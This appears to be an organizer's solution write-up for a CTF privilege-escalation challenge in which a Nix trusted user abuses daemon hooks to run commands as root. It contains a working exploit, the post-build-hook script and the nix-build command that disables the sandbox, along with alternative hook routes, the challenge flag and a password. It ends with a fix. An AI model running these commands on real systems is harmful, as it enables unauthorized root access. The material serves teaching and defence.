# The Immutable Vault - Organizer Solution

Category: System / PrivEsc · Difficulty: Medium
Flag: `pottlack{tru5ted_users_1s_jus7_r00t_w1th_extra_steps}`

## The lesson

In a multi-user Nix install the `nix-daemon` runs as root and does all store
operations on behalf of clients. Any user in `trusted-users` can override
daemon config options from the client side, and some of those options make the
daemon run arbitrary commands as root: `post-build-hook`, `build-hook`,
`diff-hook`, `pre-build-hook`. So `trusted-users = ctf` is just root with extra
steps, and the Nix manual says as much.

Enumeration scripts like LinPEAS don't flag this, so it rewards reading the
config and thinking about the trust model instead of running a scanner.

## Recon

```sh
sudo -l                      # nothing
nix show-config | grep -i trusted
#   trusted-users = root ctf       <-- the whole challenge
nix show-config | grep -i sandbox
#   sandbox = true
```

The store is root-owned, so the client talks to the daemon
(`echo $NIX_REMOTE` → `daemon`, or it's auto-detected).

## Intended exploit

A trusted user tells the root daemon to run a hook after a build. Two things to
get right:

1. The hook only fires on a real build, not a cache hit, so the derivation
   needs a unique name/output.
2. `sandbox = true` means a bare `/bin/sh` builder isn't available inside the
   sandbox. A trusted user can turn the sandbox off (`--option sandbox false`),
   which is part of the point.

```sh
# 1. The payload the root daemon runs for us.
cat > /tmp/pwn.sh <<'EOF'
#!/bin/sh
cp /root/flag.txt /tmp/flag
chmod 644 /tmp/flag
EOF
chmod +x /tmp/pwn.sh

# 2. Trigger a fresh build and attach the post-build hook. sandbox=false so a
#    /bin/sh builder works; post-build-hook runs as the daemon, i.e. root.
nix-build --expr \
  'derivation {
     name = "pwn-'"$RANDOM"'";
     system = builtins.currentSystem;
     builder = "/bin/sh";
     args = [ "-c" "echo ok > $out" ];
   }' \
  --option sandbox false \
  --option post-build-hook /tmp/pwn.sh

# 3. Collect.
cat /tmp/flag
```

`solve.sh` automates this against the live box over SSH.

## Alternative solves

All of these are fine, accept them:

- `build-hook`: point `--builders` / `--option build-hook` at a script, runs as root.
- `diff-hook` with `run-diff-hook = true` and a forced rebuild.
- `pre-build-hook`.
- Overriding `extra-sandbox-paths` / `substituters` to smuggle files in, though
  the hook route is cleaner.

## Container / deployment notes

- Base image is `debian:12-slim` plus multi-user Nix (Determinate installer,
  `--init none`). Don't switch to the `nixos/nix` image: its OpenSSH is linked
  against a glibc with no `libcrypt`, so sshd can't verify any `/etc/shadow`
  hash and the `ctf:pottlack` password login won't work (pubkey would). Debian's
  OpenSSH has a real `libcrypt`. The privesc itself doesn't care about the host
  distro — it's all in the Nix daemon.
- Builds fine under rootless Docker/podman as long as the user has an
  `/etc/subuid` range to map the `nixbld` users.
- No `--privileged` needed: the solve turns the sandbox off. If you want builds
  to succeed with the sandbox on as well, add `cap_add: [SYS_ADMIN]` and
  `security_opt: [seccomp=unconfined, apparmor=unconfined]`.
- Per-instance flags: set `FLAG` and the entrypoint rewrites `/root/flag.txt` at
  boot.

## The fix

Drop `ctf` from `trusted-users`. If the user genuinely needs to test build
configs, give them their own single-user store (`nix --store ~/.local-store ...`)
instead of trusting them on the system daemon.
